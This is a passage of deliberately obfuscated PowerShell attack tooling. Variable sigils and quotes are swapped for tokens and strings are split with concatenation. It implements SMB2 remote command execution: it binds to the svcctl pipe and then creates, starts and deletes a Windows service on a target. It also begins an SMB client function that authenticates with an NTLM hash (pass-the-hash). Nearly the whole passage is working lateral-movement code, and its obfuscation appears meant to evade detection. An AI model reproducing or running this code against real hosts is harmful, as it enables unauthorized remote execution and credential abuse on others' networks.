                                wB69SMB2_signature = wB69HMAC_SHA256.ComputeHash(wB69SMB2_sign)

                                wB69SMB2_signature = wB69SMB2_signature[0..15]

                                wB69packet_SMB2_header[NDckSignatureNDck] = wB69SMB2_signature

                                wB69SMB2_header = ConvertFrom-PacketOrderedDictionary wB69packet_SMB2_header

                            }


                            wB69client_send = wB69NetBIOS_session_service + wB69SMB2_header + wB69SMB2_data + wB69RPC_data

                            wB69stage = utH9SendReceiveutH9

                        }


'+'                        utH9CreateServiceW_LastutH9

                        {

                            wB69stage_current = wB69stage

                            wB69message_ID++

                            wB69packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 0x01,0x00 wB69SMB_signing wB69message_ID wB69process_ID wB69tree_ID wB69session_ID

                            

                            if(wB69SMB_signing)

                            {

                                wB69packet_SMB2_header[NDckFlagsNDck] = 0x08,0x00,0x00,0x00      

                            }


                            wB69SCM_data_last = wB69SCM_data[wB69SMB_split_index_tracker..wB69SCM_data.Length]

                            wB69packet_RPC_data = New-Packe'+'tRPCRequest 0x02 0 0 0 0x01,0x00,0x00,0x00 0x00,0x00 0x0c,0x00 wB69SCM_data_last

                            wB69RPC_data = ConvertFrom-PacketOrderedDictionary wB69packet_RPC_data

             '+'               wB69packet_SMB2_data = New-PacketSMB2WriteRequest wB69file_ID wB69RPC_data.Length

                            wB69SMB2_header = ConvertFrom-PacketOrderedDictionary wB69packet_SMB2_header

                            wB69SMB2_data = ConvertFrom-PacketOrderedDictionary wB69packet_SMB2_data    

                            wB69RPC_data_length = wB69SMB2_data.Length + wB69RPC_data.Length

                            wB69packet_NetBIOS_session_service = New-PacketNetBIOSSessionService wB69SMB2_header.Length wB69RPC_data_length

                            wB69NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary wB69packet_NetBIOS_session_service


                            if(wB69SMB_signing)

                            {

                                wB69SMB2_sign = wB69SMB2_header + wB69SMB2_data + wB69RPC_data

                                wB69SMB2_signature = wB69HMAC_SHA256.ComputeHash(wB69SMB2_sign)

                                wB69SMB2_signature = wB69SMB2_signature[0..15]

                                wB69packet_SMB2_header[NDckSignatureNDck] = wB69SMB2_signature

                                wB69SMB2_header = ConvertFrom-PacketOrderedDictionary wB69packet_SMB2_header

                            }


                            wB69client_send = wB69NetBIOS_session_service + wB69SMB2_header + wB69SMB2_data + wB69RPC_data

                            wB69stage = utH9SendReceiveutH9

                        }


                        utH9DeleteServiceWutH9

                        { 


                            if([System.BitConverter]::ToString(wB69client_receive[108..111]) -eq utH91d-04-00-00utH9)

                            {

                                Write-Output NDck[+] Command executed with service wB69SMB_service on wB69TargetNDck

                            }

                            elseif([System.BitConverter]::ToString(wB69client_receive[108..111]) -eq utH902-00-00-00utH9)

                            {

                                Write-Output NDck[-] Service wB69SMB_service failed to start on wB69TargetNDck

                            }


                            wB69stage_current = wB69stage

                            wB69message_ID++

                            wB69packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 0x01,0x00 wB69SMB_signing wB69message_ID wB69process_ID wB69tree_ID wB69session_ID

                            

                            if(wB69SMB_signing)

                            {

                                wB69packet_SMB2_header[NDckFlagsNDck] = 0x08,0x00,0x00,0x00

                            }


                            wB69packet_SCM_data = New-PacketSCMDeleteServiceW wB69SMB_service_context_handle

                            wB69SCM_data = ConvertFrom-PacketOrderedDictionary wB69packet_SCM_data

                            wB69packet_RPC_data = New-PacketRPCRequest 0x03 wB69SCM_data.Length 0 0 0x01,0x00,0x00,0x00 0x00,0x00 0x02,0x00

                            wB69RPC_data = ConvertFrom-PacketOrderedDictionary wB69packet_RPC_data 

                            wB69packet_SMB2_data = New-PacketSMB2WriteRequest wB69file_ID (wB69RPC_data.Length + wB69SCM_data.Length)

                            wB69SMB2_header = ConvertFrom-PacketOrderedDictionary wB69packet_SMB2_header

                            wB69SMB2_data = ConvertFrom-PacketOrderedDictionary wB69packet_SMB2_data 

                            wB69RPC_data_length = wB69SMB2_data.Length + wB69SCM_data.Length + wB69RPC_data.Length

                            wB69packet_NetBIOS_session_service = New-PacketNetBIOSSessionService wB69SMB2_header.Length wB69RPC_data_length

                            wB69NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary wB69packet_NetBIOS_session_service


                            if(wB69SMB_signing)

                            {

                                wB69SMB2_sign = wB69SMB2_header + wB69SMB2_data + wB69RPC_data + wB69SCM_data

                        '+'        wB69SMB2_signature = wB69HMAC_SHA256.ComputeHash(wB69SMB2_sign)

                                wB69SMB2_signature = wB69SMB2_signature[0..15]

                                wB69packet_SMB2_header[NDckSignatureNDck] = wB69SMB2_signature

                                wB69SMB2_header = ConvertFrom-PacketOrderedDictionary wB69packet_SMB2_header

                            }


                            wB69client_send = wB69NetBIOS_session_service + wB69SMB2_header + wB69SMB2_data + wB69RPC_data + wB69SCM_data

                            wB69stage = utH9SendReceiveutH9

                        }


                        utH9LogoffutH9

                        {

                            wB69stage_current = wB69stage

                            wB69message_ID++

                            wB69packet_SMB2_header = New-PacketSMB2Header 0x02,0x00 0x01,0x00 wB69SMB_signing wB69message_ID wB69process_ID wB69tree_ID wB69session_ID

                        

                            if(wB69SMB_signing)

                            {

                                wB69packet_SMB2_header[NDckFlagsNDck] = 0x08,0x00,0x00,0x00      

                            }

            

                            wB69packe'+'t_SMB2_data = New-PacketSMB2SessionLogoffRequest

                            wB69SMB2_header = ConvertFrom-PacketOrderedDictionary wB69packet_SMB2_hea'+'der

                            wB69SMB2_data = ConvertFrom-PacketOrderedDictionary wB69packet_SMB2_data

                            wB69packet_NetBIOS_session_service = New-PacketNetBIOSSessionService wB69SMB2_header.Length wB69SMB2_data.Length

                            wB69NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary wB69packet_NetBIOS_session_service


                            if(wB69SMB_signing)

                            {

                                wB69S'+'MB2_sign = wB69SMB2_header + wB69SMB2_data

                                wB69SMB2_signature = wB69HMAC_SHA256.ComputeHash(wB69SMB2_sign)

                                wB69SMB2_signature = wB69SMB2_signature[0..15]

                                wB69packet_SMB2_header[NDckSignatureNDck] = wB69SMB2_signature

                                wB6'+'9SMB2_header = ConvertFrom-PacketOrderedDictionary wB69packet_SMB2_header

                            }


                            wB69client_send = wB69NetBIOS_session_service + wB69SMB2_header + wB69SMB2_data

                            wB69stage = utH9SendReceiveutH9

      '+'                  }


                        utH9OpenSCManagerWutH9

                        {

                            wB69stage_current = wB69stage

                            wB69message_ID++

                            wB69packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 0x01,0x00 wB69SMB_signing wB69message_ID wB69process_ID wB69tree_ID wB69session_ID

                        

                            if(wB69SMB_signing)

                            {

                                wB69packet_SMB2_header[NDckFlagsNDck] = 0x08,0x00,0x00,0x00      

                            }


                            wB69packet_SCM_data = New-PacketSCMOpenSCManagerW wB69SMB_service_bytes wB69SMB'+'_service_length

                            wB69SCM_data = ConvertFrom-PacketOrderedDictionary wB69packet_SCM_data

                            wB69packet_RPC_data = New-PacketRPCRequest 0x03 wB69SCM_data.Length 0 0 0x01,0x00,0x00,0x00 0x00,0x00 0x0f,0x00

                            wB69RPC_data = ConvertFrom-PacketOrderedDictionary wB69packet_RPC_data 

                            wB69packet_SMB2_data = New-PacketSMB2WriteRequest wB69file_ID (wB69RPC_data.Length + wB69SCM_data.Length)

                            wB69SMB2_header = ConvertFrom-PacketOrderedDictionary wB69packet_SMB2_header

                            wB69SMB2_data = ConvertFrom-PacketOrderedDictionary wB69packet_SMB2_data 

                            wB69RPC_data_length = wB69SMB2_data.Length + wB69SCM_data.Length + wB69RPC_data.Length

                            wB69packet_NetBIOS_session_service = New-PacketNetBIOSSessionService wB69SMB2_header.Length wB69RPC_data_length

                            wB69NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary wB69packet_NetBIOS_session_service


                            if(wB69SMB_signing)

                            {

                                wB69SMB2_sign = wB69SMB2_header + wB69SMB2_data + wB69RPC_data + wB69SCM_data

                                wB69SMB2_signature = wB69HMAC_SHA256.Co'+'mputeHash(wB69SMB2_sign)

                                wB69SMB2_signature = wB69SMB2_signature[0..15]

                                wB69packet_SMB2_header[NDckSignatureNDck] = wB69SMB2_signature

                                wB69SMB2_header = ConvertFrom-PacketOrderedDictionary wB69packet_SMB2_header

                            }


                            wB69client_send = wB69NetBIOS_session_service + wB69SMB2_header + wB69SMB2_data + wB69RPC_data + wB69SCM_data

                            wB69stage = utH9SendReceiveutH9

                        }


                        utH9ReadRequestutH9

                        {

                            Start-Sleep -m wB69Sleep

                            wB69stage_current = wB69stage

                            wB69message_ID++

                            wB69packet_SMB2_header = New-PacketSMB2Header 0x08,0x00 0x01,0x00 wB69SMB_signing wB69message_ID wB69process_ID wB69tree_ID wB69session_ID

   '+'                     

                            if(wB69SMB_signing)

                            {

                                wB69packet_SMB2_header[NDckFlagsNDck] = 0x08,0x00,0x00,0x00      

                            }


                            wB69packet_SMB2_data = New-PacketSMB2ReadRequest wB69file_ID

                            wB69packet_SMB2_data[NDckLengthNDck] = 0xff,0x00,0x00,0x00

                            wB69SMB2_header = ConvertFrom-PacketOrderedDictionary wB69packet_SMB2_header

                            wB69SMB2_data = ConvertFrom-PacketOrderedDictionary wB69packet_SMB2_data 

                            wB69packet_NetBIOS_session_service = New-PacketNetBIOSSessionService wB69SMB2_header.Length wB69SMB2_data.Length

                            wB69NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary wB69packet_NetBIOS_session_service


                            if(wB69SMB_signing)

                            {

                                wB69SMB2_sign = wB69SMB2_header + wB69SMB2_data 

                                wB69SMB2_signature = wB69HMAC_SHA256.ComputeHash(wB69SMB2_sign)

                                wB69SMB2_signature = wB69SMB2_signature[0..15]

                                wB69packet_SMB2_header[NDckSignatureNDck] = wB69SMB2_signature

              '+'                  wB69SMB2_header = ConvertFrom-PacketOrderedDictionary wB69packet_SMB2_header

                            }


                            wB69client_send = wB69NetBIOS_session_service + wB69SMB2_header + wB69SMB2_data 

                            wB69stage = utH9SendReceiveutH9

                        }

                    

                        utH9RPCBindutH9

                        {

                            wB69stage_current = wB69stage

                            wB69SMB_named_pipe_bytes = 0x73,0x00,0x76,0x00,0x63,0x00,0x63,0x00,0x74,0x00,0x6c,0x00 # 9e0svcctl

                            wB69message_ID++

                            wB69pa'+'cket_SMB2_header = New-PacketSMB2Header 0x09,0x00 0x01,0x00 wB69SMB_signing wB69message_ID wB69process_ID wB69tree_ID wB69session_ID

                        

                            if(wB69SMB_signing)

                            {

                                wB69packet_SMB2_header[NDckFlagsNDck] = 0x08,0x00,0x00,0x00      

                            }


                            wB69packet_RPC_data = New-PacketRPCBind 0x48,0x00 1 0x01 0x00,0x00 wB69named_pipe_UUID 0x02,0x00

                            wB69RPC_data = ConvertFrom-PacketOrderedDictionary wB69packet_RPC_data

                            wB69packet_SMB2_data = New-PacketSMB2WriteRequest wB69file_ID wB69RPC_data.Length

                            wB69SMB2_header = ConvertFrom-PacketOrderedDictionary wB69packet_SMB2_header

                            wB69SMB2_data = ConvertFrom-PacketOrderedDictionary wB69packet_SMB2_data 

                            wB69RPC_data_length = wB69SMB2_data.Length + wB69RPC_data.Length

                            wB69packet_NetBIOS_session_service = New-PacketNetBIOSSessionService wB69SMB2_header.Length wB69RPC_data_length

                            wB69NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary wB69packet_NetBIOS_session_service


                            if(wB69SMB_signing)

                            {

                                wB69SMB2_sign = wB69SMB2_header + wB69SMB2_data + wB69RPC_data

                                wB69SMB2_signature = wB69HMAC_SHA256.ComputeHash(wB69SMB2_sign)

                                wB69SMB2_signature = wB69SMB2_signature[0..15]

                                wB69packet_SMB2_header[NDckSignatureNDck] = wB69SMB2_signature

                                wB69SMB2_header = ConvertFrom-PacketOrderedDictionary wB69packet_SMB2_header

                            }


                            wB69client_send = wB69NetBIOS_session_service + wB69SMB2_header + wB69SMB2_data + wB69RPC_data

               '+'             wB69stage = utH9SendReceiveutH9

                        }


                        utH9SendReceiveutH9

                        {

                            wB69client_stream.Write(wB69client_send,0,wB69client_send.Length) > wB69null

                            wB69client_stream.Flush()

                            wB69client_stream.Read(wB69client_receive,0,wB69client_receive.Length) > wB69null


                            if(Get-StatusPending wB69client_receive[12..15])

                            {

                                wB69stage = utH9StatusPendingutH9

                            }

                            else

                            {

                                wB69stage = utH9StatusReceivedutH9

                            }


                        }


                        utH9StartServiceWutH9

                        {

                        

                            if([System.BitConverter]::ToString(wB69client_receive[132..135]) -eq utH900-00-00-00utH9)

                            {

                                Write-Verbose NDckService wB69SMB_service created on wB69TargetNDck

                                wB69SMB_service_context_handle = wB69client_receive[112..131]

                                wB69stage_current = wB69stage

                                wB69message_ID++

                                wB69packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 0x01,0x00 wB69SMB_sig'+'ning wB69message_ID wB69process_ID wB69tree_ID wB69session_ID

                            

                                if(wB69SMB_signing)

                                {

                     '+'               wB69packet_SMB2_header[NDckFlagsNDck] = 0x08,0x00,0x00,0x00      

                                }


                                wB69packet_SCM_data = New-PacketSCMStartServiceW wB69SMB_service_context_handle

                                wB69SCM_data = ConvertFrom-PacketOrderedDictionary wB69packet_SCM_data

                                wB69packet_RPC_data = New-PacketRPCRequest 0x03 wB69SCM_data.Length 0 0 0x01,0x00,0x00,0x00 0x00,0x00 0x13,0x00

                                wB69RPC_data = ConvertFrom-PacketOrderedDictionary wB69packet_RPC_data

                                wB69packet_SMB2_data = New-PacketSMB2WriteRequest wB69file_ID (wB69RPC_data.Length + wB69SCM_data.Length)

                                wB69SMB2_header = ConvertFrom-PacketOrderedDictionary wB69packet_SMB2_header

                                wB69SMB2_data = ConvertFrom-PacketOrderedDictionary wB69packet_SMB2_data   
'+'
                                wB69RPC_data_length = wB69SMB2_data.Length + wB69SCM_data.Length + wB69RPC_data.Length

                                wB69packet_NetBIOS_session_service = New-PacketNetBIOSSessionService wB69SMB2_header.Length wB69RPC_data_length

                                wB69NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary wB69packet_NetBIOS_session_service


                                if(wB69SMB_signing)

                                {

                                    wB69SMB2_sign = wB69SMB2_header + wB69SMB2_data + wB69RPC_data + wB69SCM_data

                                    wB69SMB2_signature = wB69HMAC_SHA256.ComputeHash(wB69SMB2_sign)

                                    wB69SMB2_signature = wB69SMB2_signature[0..15]

                                    wB69packet_SMB2_header[NDckSignatureNDck] = wB69SMB2_signature

                                    wB69SMB2_header = ConvertFrom-PacketOrderedDictionary wB69packet_SMB2_header

                                }


                                wB69client_send = wB69NetBIOS_session_service + wB69SMB2_header + wB69SMB2_data + wB69RPC_data + wB69SCM_data

                                Write-Verbose NDck[*] Trying to execute command on wB69TargetNDck

                                wB69stage = utH9SendReceiveutH9

                            }

                            elseif([System.BitConverter]::ToString(wB69client_receive[132..135]) -eq utH931-04-00-00utH9)

                            {

                                Write-Output NDck[-] Service wB69SMB_service creation failed on wB69TargetNDck

                                wB69stage = utH9ExitutH9

                            }

       '+'                     else

                            {

                                Write-Output NDck[-] Service creation fault context mismatchNDck

                                wB69stage = utH9ExitutH9

                            }

    

                        }

                

                        utH9StatusPendingutH9

                        {

                            wB69client_stream.Read(wB69client_receive,0,wB69client_receive.Length) > wB69null

                            

                            if([System.BitConverter]::ToString(wB69client_receive[12..15]) -ne utH903-01-00-00utH9)

                            {

                                wB69stage = utH9StatusReceivedutH9

                            }


                        }


                        utH9StatusReceivedutH9

                        {


                            switch (wB69stage_current)

                            {


                                utH9CloseRequestutH9

                                {

                                    wB69stage = utH9TreeDisconnectutH9

                                }


                                utH9CloseServiceHandleutH9

                                {


                                    if(wB69SMB_close_service_handle_stage -eq 2)

                                    {

                                        wB69stage = utH9CloseServiceHandleutH9

                                    }

                                    else

                                    {

                                        wB69stage = utH9CloseRequestutH9

                                    }


                                }


                                utH9CreateRequestutH9

                                {

                                    wB69file_ID = wB69client_receive[132..147]


                                    if(wB69Refresh -and wB69stage -ne utH9ExitutH9)

                                    {

                                        Write-Output NDck[+] Session refreshedNDck

                                        wB69stage = utH9ExitutH9

                                    }

                                    elseif(wB69stage -ne utH9ExitutH9)

                                    {

                                        wB69stage = utH9RPCBindutH9

                                    }


                                }


                                utH9CreateServiceWutH9

                                {

                                    wB69stage = utH9ReadRequestutH9

                                    wB69stage_next = utH9StartServiceWutH9

                                }


                                utH9CreateServiceW_FirstutH9

                                {


                                    if(wB69SMB_split_stage_final -le 2)

                                    {

                                        wB69stage = utH9CreateServiceW_LastutH9

                                    }

                                    else

                                    {

                                        wB69SMB_split_stage = 2

                                        wB69stage = utH9CreateServiceW_MiddleutH9

                                    }

                                    

                                }


                                utH9CreateServiceW_MiddleutH9

                                {


                                    if(wB69SMB_split_stage -ge wB69SMB_split_stage_final)

                       '+'             {

                                        wB69stage = utH9CreateServiceW_LastutH9

                                    }

                                    else

                                    {

                                        wB69stage = utH9CreateServiceW_MiddleutH9

                                    }


                           '+'     }


                                utH9CreateServiceW_LastutH9

                                {

                                    wB69stage = utH9ReadRequestutH9

                                    wB69stage_next = utH9StartServiceWutH9

                                }


                                utH9DeleteServiceWutH9

                                {

                                    wB69stage = utH9ReadRequestutH9

                                    wB69stage_next = utH9CloseServiceHandleutH9

                                    wB69SMB_close_service_handle_stage = 1

                                }
'+'

                                utH9LogoffutH9

                                {

                                    wB69stage = utH9ExitutH9

                                }


                                utH9OpenSCManagerWutH9

                                {

                                    wB69stage = utH9ReadRequestutH9

                                    wB69stage_next = utH9CheckAccessutH9 

                                }


                                utH9ReadRequestutH9

                                {

                                    wB69stage = wB69stage_next

                      '+'          }


                                utH9RPCBindutH9

                                {

                                    wB69stage = utH9ReadRequestutH9

                                    wB69stage_next = utH9OpenSCManagerWutH9

                                }


                                utH9StartServiceWutH9

                                {

                                    wB69stage = utH9ReadRequestutH9

                                    wB69stage_n'+'ext = utH9DeleteServiceWutH9  

                                }


                                utH9TreeConnectutH9

                                {

                                    wB69tree_ID = wB69client_receive[40..43]

                                    wB69stage = utH9CreateRequestutH9

                                }


                                utH9TreeDisconnectutH9

                                {


                                    if(wB69inveigh_session -and !wB69Logoff)

                                    {

                                        wB69stage = utH9ExitutH9

                                    }

                                    else

                                    {

                                        wB69stage = utH9LogoffutH9

                                    }


                                }


                            }


                        }

                    

                        utH9TreeConnectutH9

                        {

                            wB69tree_ID = wB69client_receive[40..43]

                            wB69message_ID++

                            wB69stage_current = wB69stage

                            wB69packet_SMB2_header = New-PacketSMB2Header 0x03,0x00 0x01,0x00 wB69SMB_signing wB69message_ID wB69process_ID wB69tree_ID wB69session_ID


                            if(wB69SMB_signing)

                            {

                                wB69packet_SMB2_header[NDckFlagsNDck] = 0x08,0x00,0x00,0x00      

                            }


                            wB69packet_SMB2_data = New-PacketSMB2TreeConnectRequest wB69SMB_path_bytes

                            wB69SMB2_header = ConvertFrom-PacketOrderedDictionary wB69packet_SMB2_header

                            wB69SMB2_data = ConvertFrom-PacketOrderedDictionary wB69packet_SMB2_data    

                            wB69packet_NetBIOS_session_service = New-PacketNetBIOSSessionService wB69SMB2_header.Length wB69SMB2_data.Length

                            wB69NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary wB69packet_NetBIOS_session_service


                            if(wB69SMB_signing)

                            {

                                wB69SMB2_sign = wB69SMB2_header + wB69SMB2_data 

                                wB69SMB2_signature = wB69HMAC_SHA256.ComputeHash(wB69SMB2_sign)

                                wB69SMB2_signature = wB69SMB2_signature[0..15]

                                wB69packet_SMB2_header[NDckSignatureNDck] = wB69SMB2_signature

                                wB69SMB2_header = ConvertFrom-PacketOrderedDictionary wB69packet_SMB2_header

                            }


                            wB69client_send = wB69NetBIOS_session_service + wB69SMB2_header + wB69SMB2_data


                            try

                            {

                                wB69client_stream.Write(wB69client_send,0,wB69client_send.Length) > wB69null

                                wB69client_stream.Flush()

                                wB69client_stream.Read(wB69client_receive,0,wB69client_receive.Length) > wB69null


                                if(Get-StatusPending wB69client_receive[12..15])

                                {

                                    wB69stage = utH9StatusPendingutH9

                                }

                                else

                                {

                                    wB69stage = utH9StatusReceivedutH9

                                }

                            }

                            catch

                            {

                                Write-Output NDck[-] Session connection is closedNDck

                                wB69stage = utH9ExitutH9

                            }

                            

                        }


                        utH9TreeDisconnectutH9

                        {

                            wB69stage_current = wB69stage

                            wB69message_ID++

                            wB69packet_SMB'+'2_header = New-PacketSMB2Header 0x04,0x00 0x01,0x00 wB69SMB_signing wB69message_ID wB69process_ID wB69tree_ID wB69session_ID

                        

                            if(wB69SMB_signing)

                            {

                                wB69packet_SMB2_header[NDckFlagsNDck] = 0x08,0x00,0x00,0x00      

                            }

            

                            wB69packet_SMB2_data = New-PacketSMB'+'2TreeDisconnectRequest

                            wB69SMB2_header = ConvertFrom-PacketOrderedDictionary wB69packet_SMB2_header

                            wB69SMB2_data = ConvertFrom-PacketOrderedDictionary wB69packet_SMB2_data

                            wB69packet_NetBIOS_session_service = New-PacketNetBIOSSessionService wB69SMB2_header.Length wB69SMB2_data.Length

                            wB69NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary wB69packet_NetBIOS_session_service


                            if(wB69SMB_signing)

                            {

                                wB69SMB2_sign = wB69SMB2_header + wB69SMB2_data

                                wB69SMB2_signature = wB69HMAC_SHA256.ComputeHash(wB69SMB2_sign)

                                wB69SMB2_signature = wB69SMB2_signature[0..15]

                                wB69packet_SMB2_header[NDckSignatureNDck] = wB69SMB2_signature

                                wB69SMB2_header = ConvertFrom-PacketOrderedDictionary wB69packet_SMB2_header

                            }


                            wB69client_send = wB69NetBIOS_session_service + wB69SMB2_header + wB69SMB2_data

                            wB69stage = utH9SendReceiveutH9

                        }

    

                    }

                

                }


            }

            catch

            {

                Write-Output NDck[-] wB69(wB69_.Exception.Message)NDck

            }

        

        }


    }


    if(wB69inveigh_session -and wB69Inveigh)

    {

        wB69inveigh.session_lock_table[wB69session] = utH9openutH9

        wB69inveigh.session_message_ID_table[wB69session] = wB69message_ID

        wB69inveigh.session[wB69session] uOva Where-Object {wB69_.NDckLast ActivityNDck = Get-Date -format s}

    }


    if(!wB69inveigh_session -or wB69Logoff)

    {

        wB69client.Close()

        wB69client_stream.Close()

    }


}


}


function Invoke-SMBC

{

[CmdletBinding(DefaultParametersetName=utH9DefaultutH9)]

param

(

    [parameter(Mandatory=wB69false)][ValidateSet(NDckListNDck,NDckRecurseNDck,NDckGetNDck,NDckPutNDck,NDckDeleteNDck)][String]wB69Action = NDckListNDck,

    [parameter(Mandatory=wB69false)][String]wB69Destination,

    [parameter(ParameterSetName=utH9AuthutH9,Mandatory=wB69true)][String]wB69Username,

    [parameter(ParameterSetName=utH9AuthutH9,Mandatory=wB69false)][String]wB69Domain,

    [parameter(Mandatory=wB69true)][Object]wB69Source,

    [parameter(ParameterSetName=utH9AuthutH9,Mandatory=wB69true)][ValidateScript({wB69_.Length -eq 32 -or wB69_.Length -eq 65})][String]wB69Hash,

    [parameter(Mandatory=wB69false)][Switch]wB69Modify,

    [parameter(Mandatory=wB69false)][Switch]wB69NoProgress,

    [parameter(Mandatory=wB69false)][ValidateSet(NDckAutoNDck,NDck1NDck,NDck2.1NDck)][String]wB69Version=NDckAutoNDck,

    [parameter(ParameterSetName=utH9SessionutH9,Mandatory=wB69false)][Int]wB69Session,

    [parameter(ParameterSetName=utH9SessionutH9,Mandatory=wB69false)][Switch]wB69Logoff,

    [parameter(ParameterSetName=utH9SessionutH9,Mandatory=wB69false)][Switch]wB69Refresh,

    [parameter(Mandatory=wB69false)][Int]wB69Sleep=100

)


if(wB69Version -eq utH91utH9)

{

    wB69SMB_version = utH9SMB1utH9

}

elseif(wB69Version -eq utH92.1ut'+'H9)

{

    wB69SMB_version = utH9SMB2.1utH9

}


if(wB69PsCmdlet.ParameterSetName -ne utH9AuthutH9 -and wB69PsCmdlet.ParameterSetName -ne utH9SessionutH9)

{

    wB69signing_check = wB69true

}


function ConvertFrom-PacketOrderedDictionary

{

    param(wB69ordered_dictionary)


    ForEach(wB69field in wB69ordered_dictionary.Values)

    {

        wB69byte_array += wB69field

    }


    return wB69byte_array

}


#NetBIOS


function New-PacketNetBIOSSessionService

{

    param([Int]wB69HeaderLength,[Int]wB69DataLength)


    [Byte[]]wB69length = ([System.BitConverter]::GetBytes(wB69HeaderLength + wB69DataLength))[2..0]


    wB69NetBIOSSessionService = New-Object System.Collections.Specialized.OrderedDictionary

    wB69NetBIOSSessionService.Add(NDckMessageTypeNDck,[Byte[]](0x00))

    wB69NetBIOSSessionService.Add(NDckLengthNDck,wB69length)


    return wB69NetBIOSSessionService

}


#SMB1


function New-PacketSMBHeader

{

    param([Byte[]]wB69Command,[Byte[]]wB69Flags,[Byte[]]wB69Flags2,[Byte[]]wB69TreeID,[Byte[]]wB69ProcessID,[Byte[]]wB69UserID)


    wB69ProcessID = wB69ProcessID[0,1]


    wB69SMBHeader = New-Object System.Collections.Specialized.OrderedDictionary

    wB69SMBHeader.Add(NDckProtocolNDck,[Byte[]](0xff,0x53,0x4d,0x42))

    wB69SMBHeader.Add(NDckCommandNDck,wB69Command)

    wB69SMBHeader.Add(NDckErrorClassNDck,[Byte[]](0x00))

    wB69SMBHeader.Add(NDckReservedNDck,[Byte[]](0x00))

    wB69SMBHeader.Add(NDckErrorCodeNDck,[Byte[]](0x00,0x00))

    wB69SMBHeader.Add(NDckFlagsNDck,wB69Flags)

    wB69SMBHeader.Add(NDckFlags2NDck,wB69Flags2)

    wB69SMBHeader.Add(NDckProcessIDHighNDck,[Byte[]](0x00,0x00))

    wB69SMBHeader.Add(NDckSignatureNDck,[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

    wB69SMBHeader.Add(NDckReserved2NDck,[Byte[]](0x00,0x00))

    wB69SMBH'+'eader.Add(NDckTreeIDNDck,wB69TreeID)

    wB69SMBHeader.Add(NDckProcessIDNDck,wB69ProcessID)

    wB69SMBHeader.Add(NDckUserIDNDck,wB69UserID)

    wB69SMBHeader.Add(NDckMultiplexIDNDck,[Byte[]](0x00,0x00))


    return wB69SMBHeader

}


function New-PacketSMBNegotiateProtocolRequest

{

    param([String]wB69Version)


    if(wB69version -eq utH9SMB1utH9)

    {

        [Byte[]]wB69byte_count = 0x0c,0x00

    }

    else

    {

        [Byte[]]wB69byte_count = 0x22,0x00  

    }


    wB69SMBNegotiateProtocolRequest = New-Object System.Collections.Specialized.OrderedDictionary

    wB69SMBNegotiateProtocolRequest.Add(NDckWordCountNDck,[Byte[]](0x00))

    wB69SMBNegotiateProtocolRequest.Add(NDckByteCountNDck,wB69byte_count)

    wB69SMBNegotiateProtocolRequest.Add(NDckRequestedDialects_Dialect_BufferFormatNDck,[Byte[]](0x02))

    wB69SMBNegotiateProtocolRequest.Add(NDckRequestedDialects_Dialect_NameNDck,[Byte[]](0x4e,0x54,0x20,0x4c,0x4d,0x20,0x30,0x2e,0x31,0x32,0x00))


    if(wB69version -ne utH9SMB1utH9)

    {

        wB69SMBNegotiateProtocolRequest.Add(NDckRequestedDialects_Dialect_BufferFormat2NDck,[Byte[]](0x02))

        wB69SMBNegotiateProtocolRequest.Add(NDckRequestedDialects_Dialect_Name2NDck,[Byte[]](0x53,0x4d,0x42,0x20,0x32,0x2e,0x30,0x30,0x32,0x00))

        wB69SMBNegotiateProtocolRequest.Add(NDckRequestedDialects_Dialect_BufferFormat3NDck,[Byte[]](0x02))

        wB69SMBNegotiateProtocolRequest.Ad'+'d(NDckRequestedDialects_Dialect_Name3NDck,[Byte[]](0x53,0x4d,0x42,0x20,0x32,0x2e,0x3f,0x3f,0x3f,0x00))

    }


    return wB69SMBNegotiateProtocolRequest

}


function New-PacketSMBSessionSetupAndXRequest

{

    param([Byte[]]wB69SecurityBlob)


    [Byte[]]wB69byte_count = [System.BitConverter]::GetBytes(wB69SecurityBlob.Length)[0,1]

    [Byte[]]wB69security_blob_length = [System.BitConverter]::GetBytes(wB69SecurityBlob.Length + 5)[0,1]


    wB69SMBSessionSetupAndXRequest = New-Object System.Collections.Specialized.OrderedDictionary

    wB69SMBSessionSetupAndXRequest.Add(NDckWordCountNDck,[Byte[]](0x0c))

    wB69SMBSessionSetupAndXRequest.Add(NDckAndXCommandNDck,[Byte[]](0xff))

    wB69SMBSessionSetupAndXRequest.Add(NDckReservedNDck,[Byte[]](0x00))

    wB69SMBSessionSetupAndXRequest.Add(NDckAndXOffsetNDck,[Byte[]](0x00,0x00))

    wB69SMBSessionSetupAndXRequest.Add(NDckMaxBufferNDck,[Byte[]](0xff,0xff))

    wB69SMBSessionSetupAndXRequest.Add(NDckMaxMpxCountNDck,[Byte[]](0x02,0x00))

    wB69SMBSessionSetupAndXRequest.Add(NDckVCNumberNDck,[Byte[]](0x01,0x00))

    wB69SMBSessionSetupAndXRequest.Add(NDckSessionKeyNDck,[Byte[]](0x00,0x00,0x00,0x00))

    wB69SMBSessionSetupAndXRequest.Add(NDckSecurityBlobLengthNDck,wB69byte_count)

    wB69SMBSessionSetupAndXRequest.Add(NDckReserved2NDck,[Byte[]](0x00,0x00,0x00,0x00))

    wB69SMBSessionSetupAndXRequest.Add(NDckCapabilitiesNDck,[Byte[]](0x44,0x00,0x00,0x80))

    wB69SMBSessionSetupAndXRequest.Add(NDckByteCountNDck,wB69security_blob_length)

    wB69SMBSessionSetupAndXRequest.Add(NDckSecurityBlobNDck,wB69SecurityBlob)

    wB69SMBSessionSetupAndXRequest.Add(NDckNativeOSNDck,[Byte[]](0x00,0x00,0x00))

    wB69SMBSessionSetupAndXRequest.Add(NDckNativeLANManageNDck,[Byte[]](0x00,0x00))


    return wB69SMBSessionSetupAndXRequest 

}


#'+'SMB2


function New-PacketSMB2Header

{

